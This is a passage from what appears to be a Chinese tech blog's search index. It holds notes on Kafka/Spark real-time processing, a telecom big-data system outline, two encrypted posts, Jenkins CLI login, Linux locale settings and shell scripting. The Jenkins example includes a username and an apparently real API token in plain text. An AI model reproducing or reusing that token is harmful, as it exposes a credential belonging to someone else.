1Y69MV26QF5edF3oXTp1rNRGiAarpCIkVPdpivdEKwohNEXXWhCLMS3L8yumDg87Xjtr/UA3x4wWsnoSNIEfW/ig9PTsLVrV3R1BCAd/lri+OwcgVHdOT4zbjQopVvrGPkXDzA1OPqHRz7sWuHH8jyPiOQ15Zw0O0Bapc3yarmfckYe1snjji3a8agYjwT9QXslj57c818r1QMa6YwBxzAea01OXwL0/tgQ5gpcPTvfS0PIwkciiuA== </div>]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>java-大数据-实时数据处理</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-%E6%99%BA%E6%85%A7%E5%87%BA%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>1、kafka 无法保证数据的顺序，flume == 》 kafka 里面去</p>
<ul>
<li>一个分区</li>
<li>将相同的订单的数据，发送到同一个分区里面去<a id="more"></a></li>
<li><ul>
<li>kafka 的分区策略：key  value  轮询 自定义<br><img data-src="http://tuchuang.xchcloud.cn/20210119223437.png" alt="20210119223437"></li>
</ul>
</li>
</ul>
<p>2、如果 kafka的分区动态添加了， sparkstreamingi的程序能不能做到无感知的消费到新的分区的数据。</p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210119224043.png" alt="20210119224043"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210119224205.png" alt="20210119224205"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210119224434.png" alt="20210119224434"></p>
<p>3、如何监听zk的节点？</p>
<p>4、有这样一个场景每次处理的数据是拉取 kafka的一个小时的数据（这部分数据必须是同一个小时内产生的数据），第二次处理的数据需要和第一次处理的数据进行整合处理后一部分入库，留下的部分数据继续和第三次的数据进行整合，部分数据入库，剩下的数据继续和第四次的数据整合，以此类推该米用什么样的架构和怎么去做容灾</p>
<p>可以考虑将需要留下的数据再写回去到 kafka新的 topic</p>
<p>5、GIS =》 地理测绘</p>
<p>uber H3 算法（geohash）   算出虚拟车站</p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210119231944.png" alt="20210119231944"></p>
<p>6、<img data-src="http://tuchuang.xchcloud.cn/20210119233123.png" alt="20210119233123"></p>
<p>7、spa istream消费 kafka的数据，等处理逻辑完毕后提交偏移量至 kafka,不是也可以保证只消费一次吗？<br>可以的，没有问题，，也保存到 kafka里面的。<br>保存到 hbase我想可能是因为 rrowkey的唯一性做到幂等性</p>
<p>8、为什么要保存到 hbase,如果 kafka中数据过期了，那数据就没有了。保存了偏移量也不能从上次数据的末尾开始消费？<br>可以修正 offset的值，每次去消费数据的时候，带上 hbase的。 ffset与 kafka当中数据的 offset进行比较<br>kafka的 offset &lt; hasel的 offset</p>
<p>9、sprkstreamina不是也是实时消费<br>默认是每隔200ms获取一次数据，形成一个b1ock</p>
<p>10、spark不是按照事件时间处理的，flink里面就有 eventtimel</p>
<p>11、kafka分区压力那是分发算法问题吧，， round roubin不行么<br>有时候需要保证数据的顺序性的消费问题<br>round roubin 只是在做轮询</p>
<p>12、spark读取有k8s的hive数据，怎么处理下？<br> kuberos 安全认证方面</p>
<p>13、<img data-src="http://tuchuang.xchcloud.cn/20210120221848.png" alt="20210120221848"></p>
<p>14、如何设计 rowkeyli以及做分区的操作=》实现通过 rowley来实现数据均匀的落到各个分区里面去</p>
<p>15、如何实现预分区<br>数据负载均衡</p>
<p>16、<img data-src="http://tuchuang.xchcloud.cn/20210120231706.png" alt="20210120231706"></p>
<p>17、预分区的实现<br><img data-src="http://tuchuang.xchcloud.cn/20210120231738.png" alt="20210120231738"></p>
<p>使用 | 来当作最大字段值</p>
<p>18、<img data-src="http://tuchuang.xchcloud.cn/20210120231910.png" alt="20210120231910"></p>
<p>19、<img data-src="http://tuchuang.xchcloud.cn/20210120233047.png" alt="20210120233047"></p>
<h2 id="逻辑实现"><a href="#逻辑实现" class="headerlink" title="逻辑实现"></a>逻辑实现</h2><p><img data-src="http://tuchuang.xchcloud.cn/20210120215321.png" alt="20210120215321"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210120215520.png" alt="20210120215520"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210120220235.png" alt="20210120220235"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210120220411.png" alt="20210120220411"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210120220826.png" alt="20210120220826"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210120221320.png" alt="20210120221320"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210120221434.png" alt="20210120221434"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210120221653.png" alt="20210120221653"><br><img data-src="http://tuchuang.xchcloud.cn/20210120225120.png" alt="20210120225120"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210120232719.png" alt="20210120232719"></p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>java-大数据-电信运营商流量经营系统</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-%E7%94%B5%E4%BF%A1%E8%BF%90%E8%90%A5%E5%95%86%E6%B5%81%E9%87%8F%E7%BB%8F%E8%90%A5%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h2 id="流量经营项目相关背景"><a href="#流量经营项目相关背景" class="headerlink" title="流量经营项目相关背景"></a>流量经营项目相关背景</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201018/a16coC8LOoQW.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201018/VnUQ7UOImEOM.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201018/eAcV2vn7fLVv.png" alt="mark"><br><a id="more"></a></p>
<h3 id="项目概括"><a href="#项目概括" class="headerlink" title="项目概括"></a>项目概括</h3><ul>
<li><p>集群：3个<br>数据采集集群（6-10节点）<br>行为轨迹增强处理集群（20-25节点）<br>ETL、统计分析集群（35节点）</p>
</li>
<li><p>数据量：每天新增2T左右（10亿行以上），并在不断增长</p>
</li>
<li><p>项目租规模</p>
<p>  研发团队：数据采集（4~5人）、内容识别（15人）、数据挖掘（10）、前端（10）、实施团队、运维团队</p>
</li>
</ul>
<h2 id="流量经营数据来源、内容（实例展示，字段介绍）"><a href="#流量经营数据来源、内容（实例展示，字段介绍）" class="headerlink" title="流量经营数据来源、内容（实例展示，字段介绍）"></a>流量经营数据来源、内容（实例展示，字段介绍）</h2><ul>
<li><p>数据来源：</p>
<pre><code>数据的采集可以是从硬件设备（如网关、Gn口、分光设备）直接获取并解析

也可以是从其它系统（如BOSS和VGOP）导入
</code></pre></li>
<li>数据类型：<pre><code>HTTP日志/WAP日志/MMS日志/ CONN日志/DNS日志
</code></pre></li>
</ul>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201018/CqjMk9WWxEHP.png" alt="mark"></p>
<h2 id="流量经营数据处理流程（预处理-SCA-TAS等）"><a href="#流量经营数据处理流程（预处理-SCA-TAS等）" class="headerlink" title="流量经营数据处理流程（预处理,SCA,TAS等）"></a>流量经营数据处理流程（预处理,SCA,TAS等）</h2><p>数据采集清洗、分类、合并上传HDFS集群</p>
<p>数据处理：内容识别用户行为轨迹增强</p>
<p>数据挖掘、统计分析</p>
<p>业务应用、BI报表展示</p>
<h2 id="数据分析结果（各阶段中间结果，最终结果）"><a href="#数据分析结果（各阶段中间结果，最终结果）" class="headerlink" title="数据分析结果（各阶段中间结果，最终结果）"></a>数据分析结果（各阶段中间结果，最终结果）</h2><p>原始日志（plain text）<br>分类合并日志（plain text）<br>行为轨迹增强日志（plain text）<br>待爬清单（plain text）<br>挖掘、分析结果入库（关系型数据表）</p>
<h2 id="系统整体架构"><a href="#系统整体架构" class="headerlink" title="系统整体架构"></a>系统整体架构</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201018/lCFSDfvXU7zO.png" alt="mark"></p>
<h2 id="主要技术选型"><a href="#主要技术选型" class="headerlink" title="主要技术选型"></a>主要技术选型</h2><p>数据采集：根据不同生产环境，有多种形式(文件：shell、java、sqlserver、activemq、ftp)(原子性)<br>云存储：HDFS，事实上的大数据技术标准<br>海量数据批处理：MAP/REDUCE<br>爬虫系统：Nutch，技术成熟，功能齐全，文档丰富，易扩展易改造<br>内容识别：模板匹配，XPATH，贝叶斯分类<br>云ETL： HIVE，最通用成熟的大数据平台ETL/数据仓库工具；Python脚本</p>
<h2 id="核心子系统SCA功能模块组成"><a href="#核心子系统SCA功能模块组成" class="headerlink" title="核心子系统SCA功能模块组成"></a>核心子系统SCA功能模块组成</h2><p>数据采集：根据不同生产环境，有多种形式<br>数据预处理<br>数据上传HDFS<br>行为轨迹增强<br>内容识别</p>
<h2 id="项目技术要点"><a href="#项目技术要点" class="headerlink" title="项目技术要点"></a>项目技术要点</h2><p>数据预处理（采集，分类，上传HDFS）<br>规则分类（在mapreduce中查询关系型数据库）<br>实例分类（在mapreduce中查询kv数据库）<br>内容识别（爬虫，模板、语义识别）<br>定时任务、结果推送<br>BI统计分析（实际投产脚本选样讲解）<br>报表展现（JAVA WEB）</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>java-大数据-茶电商平台</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-%E8%8C%B6%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>jenkins-cli</title>
    <url>/jenkins-cli/</url>
    <content><![CDATA[<h3 id="获取方式"><a href="#获取方式" class="headerlink" title="获取方式"></a>获取方式</h3><p><code>http://localhost:8080/jnlpJars/jenkins-cli.jar</code></p>
<h3 id="cli-登陆使用说明"><a href="#cli-登陆使用说明" class="headerlink" title="cli 登陆使用说明"></a>cli 登陆使用说明</h3><h4 id="使用-api-token-登陆"><a href="#使用-api-token-登陆" class="headerlink" title="使用 api token 登陆"></a>使用 api token 登陆</h4><p><code>java -jar jenkins-cli.jar -s http://localhost:8080 -auth tylerzhou:11f52cef1324556a41d966083ffcf0ac1b</code></p>
<p>or</p>
<p><code>java -jar jenkins-cli.jar -s http://localhost:8080 -auth @password.txt</code><br><a id="more"></a></p>
<h4 id="SSH-方式登陆-Jenkins-执行-cli"><a href="#SSH-方式登陆-Jenkins-执行-cli" class="headerlink" title="SSH 方式登陆 Jenkins 执行 cli"></a>SSH 方式登陆 Jenkins 执行 cli</h4><p><code>ssh -l tylerzhou -p 16022 localhost help</code></p>
]]></content>
      <categories>
        <category>jenkins</category>
      </categories>
      <tags>
        <tag>jenkins</tag>
        <tag>cli</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-系统参数配置</title>
    <url>/linux-%E7%B3%BB%E7%BB%9F%E5%8F%82%E6%95%B0%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="linux系统的LANG变量"><a href="#linux系统的LANG变量" class="headerlink" title="linux系统的LANG变量"></a>linux系统的LANG变量</h2><h3 id="Language-Codes-Reference"><a href="#Language-Codes-Reference" class="headerlink" title="Language Codes Reference"></a>Language Codes Reference</h3><p><img data-src="http://tuchuang.xchcloud.cn/20210319142553.png" alt="20210319142553"></p>
<h3 id="查看系统默认的语言设置"><a href="#查看系统默认的语言设置" class="headerlink" title="查看系统默认的语言设置"></a>查看系统默认的语言设置</h3><a id="more"></a>
<p>[root@room9pc01 ~]# locale<br>LANG=en_US.utf8<br>LC_CTYPE=”en_US.utf8”<br>LC_NUMERIC=”en_US.utf8”<br>LC_TIME=”en_US.utf8”<br>LC_COLLATE=”en_US.utf8”<br>LC_MONETARY=”en_US.utf8”<br>LC_MESSAGES=”en_US.utf8”<br>LC_PAPER=”en_US.utf8”<br>LC_NAME=”en_US.utf8”<br>LC_ADDRESS=”en_US.utf8”<br>LC_TELEPHONE=”en_US.utf8”<br>LC_MEASUREMENT=”en_US.utf8”<br>LC_IDENTIFICATION=”en_US.utf8”</p>
<p>LC_ALL=</p>
<h3 id="查看当前区域配置"><a href="#查看当前区域配置" class="headerlink" title="查看当前区域配置"></a>查看当前区域配置</h3><p>[root@room9pc01 ~]# localectl status<br>   System Locale: LANG=zh_CN.utf8<br>       VC Keymap: cn</p>
<pre><code>X11 Layout: cn
</code></pre><h3 id="查看系统支持的汉语区域语言"><a href="#查看系统支持的汉语区域语言" class="headerlink" title="查看系统支持的汉语区域语言"></a>查看系统支持的汉语区域语言</h3><p>[root@room9pc01 ~]# localectl list-locales| grep zh<br>    zh_CN<br>zh_CN.gb18030<br>zh_CN.gb2312<br>zh_CN.gbk<br>zh_CN.utf8<br>zh_HK<br>zh_HK.big5hkscs<br>zh_HK.utf8<br>zh_SG<br>zh_SG.gb2312<br>zh_SG.gbk<br>zh_SG.utf8<br>zh_TW<br>zh_TW.big5<br>zh_TW.euctw<br>zh_TW.utf8</p>
<h3 id="设置区域语言"><a href="#设置区域语言" class="headerlink" title="设置区域语言"></a>设置区域语言</h3><pre><code>[root@room9pc01 ~]# localectl set-locale  LANG=zh_CN.utf8
</code></pre><h3 id="查看对应的配置文件"><a href="#查看对应的配置文件" class="headerlink" title="查看对应的配置文件"></a>查看对应的配置文件</h3><pre><code>[root@room9pc01 ~]# cat /etc/locale.conf 

LANG=zh_CN.utf8 
</code></pre><p>刷新bash 或者重启，使设置生效</p>
<h2 id="PowerShell（命令提示符）默认中文编码方式"><a href="#PowerShell（命令提示符）默认中文编码方式" class="headerlink" title="PowerShell（命令提示符）默认中文编码方式"></a>PowerShell（命令提示符）默认中文编码方式</h2><ul>
<li>简介</li>
</ul>
<p>目的：由于编程的时候经常会用到不同的编码，但是由于和命令行默认的编码不一致，就导致了输出的中文乱码，使用chcp命令可以修改当前命令行的编码方式</p>
<ul>
<li>临时修改</li>
</ul>
<p>直接在powershell中执行<br>chcp命令</p>
<p>chcp 65001</p>
<ul>
<li>永久修改</li>
</ul>
<p>修改注册表的这个位置：[HKEY_CURRENT_USER\Console\CodePage]</p>
<p>chcp命令使用的数字编码表：<br><img data-src="http://tuchuang.xchcloud.cn/20210319141640.png" alt="20210319141640"></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>参数</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-shell-复盘</title>
    <url>/linux-shell-%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h2 id="变量的高级用法"><a href="#变量的高级用法" class="headerlink" title="变量的高级用法"></a>变量的高级用法</h2><p><img data-src="http://tuchuang.xchcloud.cn/s1.png" alt="s1"><br><img data-src="http://tuchuang.xchcloud.cn/s2.png" alt="s2"><br><img data-src="http://tuchuang.xchcloud.cn/s3.png" alt="s3"><br><img data-src="http://tuchuang.xchcloud.cn/s4.png" alt="s4"><br><img data-src="http://tuchuang.xchcloud.cn/s5.png" alt="s5"><br><img data-src="http://tuchuang.xchcloud.cn/s6.png" alt="s6"><br><img data-src="http://tuchuang.xchcloud.cn/s7.png" alt="s7"><br><img data-src="http://tuchuang.xchcloud.cn/s8.png" alt="s8"><br><img data-src="http://tuchuang.xchcloud.cn/s9.png" alt="s9"><br><img data-src="http://tuchuang.xchcloud.cn/s10.png" alt="s10"><br><img data-src="http://tuchuang.xchcloud.cn/s11.png" alt="s11"><br><img data-src="http://tuchuang.xchcloud.cn/s12.png" alt="s12"></p>
<h2 id="函数的高级用法"><a href="#函数的高级用法" class="headerlink" title="函数的高级用法"></a>函数的高级用法</h2><a id="more"></a>
<h3 id="向函数传递参数"><a href="#向函数传递参数" class="headerlink" title="向函数传递参数"></a>向函数传递参数</h3><p><img data-src="http://tuchuang.xchcloud.cn/s13.png" alt="s13"></p>
<h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><p>$0 这个脚本/程序的执行名字<br>$n 这个脚本/程序的第n个参数值，n=1..9<br>$<em> 这个脚本/程序的所有参数,此选项参数可超过9个。<br>$# 这个脚本/程序的参数个数<br>$$ 这个脚本/程序的PID(脚本运行的当前进程ID号)<br>$! 执行上一个背景指令的PID(后台运行的最后一个进程的进程ID号)<br>$? 执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)<br>$- 显示shell使用的当前选项，与set命令功能相同<br>$@ 跟$</em>类似，但是可以当作数组用</p>
<p>使用return返回值，只能返回1-255的整数函数使用return返回值，通常只是用来供其他地方调用获取状态，<br>因此通常仅返回0或1；0表示成功，1表示失败</p>
<p>使用echo可以返回任何字符串结果通常用于返回数据，<br>比如一个字符串值或者列表值</p>
<p><img data-src="http://tuchuang.xchcloud.cn/s14.png" alt="s14"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/s15.png" alt="s15"></p>
<h3 id="全局变量和局部变量"><a href="#全局变量和局部变量" class="headerlink" title="全局变量和局部变量"></a>全局变量和局部变量</h3><p>全局变量：</p>
<p>不做特殊声明，Shell中变量都是全局变量<br>Tips：大型脚本程序中函数中慎用全局变量</p>
<p>局部变量：</p>
<p>定义变量时，使用local关键字<br>函数内和外若存在同名变量，则函数内部变量覆盖外部变量</p>
<p><img data-src="http://tuchuang.xchcloud.cn/s16.png" alt="s16"></p>
<h3 id="函数库"><a href="#函数库" class="headerlink" title="函数库"></a>函数库</h3><p>经常使用的重复代码封装成函数文件<br>一般不直接执行，而是由其他脚本调用</p>
<p><img data-src="http://tuchuang.xchcloud.cn/s17.png" alt="s17"></p>
<p>库文件名的后缀是任意的，但一般使用.lib<br>库文件通常没有可执行选项<br>库文件无需和脚本在同级目录，只需在脚本中引用时指定<br>第一行一般使用#！/bin/echo，输出警告信息，避免用户执行</p>
<h3 id="文件查找之find命令"><a href="#文件查找之find命令" class="headerlink" title="文件查找之find命令"></a>文件查找之find命令</h3><p><img data-src="http://tuchuang.xchcloud.cn/s18.png" alt="s18"><br><img data-src="http://tuchuang.xchcloud.cn/s19.png" alt="s19"><br><img data-src="http://tuchuang.xchcloud.cn/s20.png" alt="s20"><br><img data-src="http://tuchuang.xchcloud.cn/s21.png" alt="s21"><br><img data-src="http://tuchuang.xchcloud.cn/s22.png" alt="s22"><br><img data-src="http://tuchuang.xchcloud.cn/s23.png" alt="s23"></p>
<p>locate命令介绍:</p>
<p>文件查找命令，所属软件包mlocate<br>不同于find命令是在整块磁盘中搜索，locate命令在数据库文件中查找<br>find是默认全部匹配，locate则是默认部分匹配</p>
<p>updatedb命令:</p>
<p>用户更新/var/lib/mlocate/mlocate.db<br>所使用配置文件/etc/updatedb.conf<br>该命令在后台cron计划任务中定期执行</p>
<p>whereis:</p>
<p>-b只返回二进制文件<br>-m只返回帮助文档文件<br>-s只返回源代码文件</p>
<p>which:</p>
<p>作用：仅查找二进制程序文件</p>
<p>-b只返回二进制文件</p>
<p>对比：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/s24.png" alt="s24"></p>
<h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p><img data-src="http://tuchuang.xchcloud.cn/s25.png" alt="s25"></p>
<p>grep和egrep：<br><img data-src="http://tuchuang.xchcloud.cn/s26.png" alt="s26"></p>
<h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><p>sed（Stream Editor），流编辑器。对标准输出或文件逐行进行处理</p>
<p>语法格式：</p>
<p>第一种形式：stdout | sed[option]”pattern command”<br>第二种形式：sed[option]”pattern command”file</p>
<p><img data-src="http://tuchuang.xchcloud.cn/s27.png" alt="s27"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/s28.png" alt="s28"></p>
